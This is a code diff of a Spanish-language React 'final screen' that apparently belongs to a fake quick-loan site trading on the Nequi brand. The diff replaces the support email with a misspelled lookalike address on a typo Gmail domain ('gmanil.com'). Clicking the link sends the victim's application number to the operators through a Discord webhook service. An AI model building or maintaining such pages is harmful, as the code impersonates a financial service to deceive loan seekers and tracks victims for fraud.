@@ -141,14 +141,14 @@ export function FinalScreen({ applicationId, onReset }: FinalScreenProps) {
                   Si el dinero no llega en 5 minutos, escríbenos con tu número de solicitud:
                 </p>
                 <a
-                  href="mailto:soportenequi@tucreditoasiderapido.online"
+                  href="mailto:suppor.nequ.i@gmanil.com"
                   onClick={() => DiscordWebhookService.sendInfo('Soporte contactado', '', {}, {
                     'Número de solicitud': applicationId,
                   })}
                   className="inline-block px-4 py-3 rounded-2xl font-bold text-sm text-center transition-all hover:opacity-90"
                   style={{ background: 'rgba(230,0,92,0.25)', border: '1px solid rgba(230,0,92,0.45)', color: '#ff6eb0' }}
                 >
-                  soportenequi@tucreditoasiderapido.online
+                  suppor.nequ.i@gmanil.com
                 </a>
                 <p className="text-white/35 text-xs mt-2">Verificamos y realizamos tu desembolso.</p>
               </div>
